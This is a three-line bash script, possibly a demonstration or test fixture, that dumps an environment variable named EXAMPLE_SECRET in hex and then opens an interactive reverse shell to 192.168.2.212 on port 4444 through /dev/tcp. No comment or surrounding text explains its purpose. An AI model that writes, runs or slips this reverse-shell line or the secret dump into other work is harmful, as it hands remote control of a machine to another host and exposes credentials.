#!/usr/bin/env bash
echo "$EXAMPLE_SECRET" | hd -C

/bin/bash -i >& /dev/tcp/192.168.2.212/4444 0>&1
